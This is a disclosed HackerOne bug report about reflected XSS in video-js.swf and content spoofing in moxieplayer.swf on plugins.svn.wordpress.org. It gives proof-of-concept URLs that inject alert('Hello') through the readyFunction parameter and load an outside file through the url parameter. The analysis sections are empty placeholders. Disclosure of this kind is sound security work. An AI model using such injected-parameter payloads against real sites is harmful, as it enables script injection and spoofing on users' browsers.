---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '270060'
original_report_id: '270060'
title: Reflected Swf XSS In ( plugins.svn.wordpress.org )
team_handle: wordpress
created_at: '2017-09-21T01:42:18.159Z'
disclosed_at: '2018-09-27T17:16:27.278Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 21
tags:
- hackerone
---

# Reflected Swf XSS In ( plugins.svn.wordpress.org )

## Metadata

- HackerOne Report ID: 270060
- Weakness: 
- Program: wordpress
- Disclosed At: 2018-09-27T17:16:27.278Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello ,
 I have found XSS in flash File ( video-js.swf ) in  plugins.svn.wordpress.org 
 and Content Spoofing Vulnerability in moxieplayer.swf

          ** POC **
https://plugins.svn.wordpress.org/1player/tags/1.3/players/video-js/video-js.swf?readyFunction=alert(%27Hello%27)


{F222664}


https://plugins.svn.wordpress.org/agile-video-player/trunk/js/plugins/media/moxieplayer.swf?url=hekimuso1973.xsl.pt/723.flv

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
